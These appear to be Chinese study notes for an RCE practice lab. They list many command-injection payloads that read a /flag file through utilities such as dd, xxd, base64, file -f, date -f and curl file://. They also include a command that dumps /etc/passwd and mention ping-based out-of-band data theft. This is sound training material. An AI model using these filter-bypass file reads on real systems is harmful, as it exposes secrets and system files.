# RCE 远程代码执行
## Apursuit/rce-labs
用 [Apursuit/rce-labs](https://github.com/Apursuit/rce-labs) 靶场学习。  

cat, tac, head, tail, more, less, nl, sort(排序), uniq(去重), strings 直接用。  

### dd
``` bash
dd if=/flag 
```
即可读写 /flag 字符串默认输出到标准输出。也可以更丰富：  
```
dd if=/flag 2>/dev/null
dd if=/flag of=/dev/stdout
```

### rev
反序输出，加个管道回去就正向了。  
```
rev /flag | rev
```

### od
od 默认输出是八进制。可以用 `-c` 显示字符内容：  
```bash
od -c /flag
```

更精简：  
```
od -An -c /flag
```

### xxd
xxd 用于转储十六进制。  

用管道做两次转换即可：  

```
xxd -p /flag | xxd -r -p
```

### hexdump
hexdump 用十六进制转储文件。  

这样就能显示字符串：  
```
hexdump -C /flag
```

复杂点可以：  
``` bash
hexdump -v -e '/1 "%c"' /flag
hexdump -e '16/1 "%_p"' /flag    # 不可打印字符显示为 .
```

### base32/base64
祖传管道编解码。  
```
base32 /flag | base32 -d
base64 /flag | base64 -d

```

### grep
搜索特定模式，拿来输出所有行：  
```
grep '' /flag
grep . /flag
grep -v '^$' /flag
```


### file
显示文件类型，可以触发报错读取。  
这道题 deepseek 和 gpt luna 都说不行，最后还是我找的博客。……  
-f 报错出具体内容。  

```
file -f /flag
```

### date
直接读文件，把 stderr 定向到 stdout 即可。  
```
date -f /flag 2>&1
```

### diff
一键获取两个文件信息(x
```
diff /flag /etc/passwd
```

### find
找文件而已，要求的 payload 找到 findme.txt:  
```
find / -name 'findme.txt'
```

### ping
可以用 ping 测试出网外带数据，在无回显场景下窃取 flag。  


### awk
```
awk '{print}' /flag
```

### curl
```
curl file:///flag
```

### echo
通过输出重定向写入文件

### sed
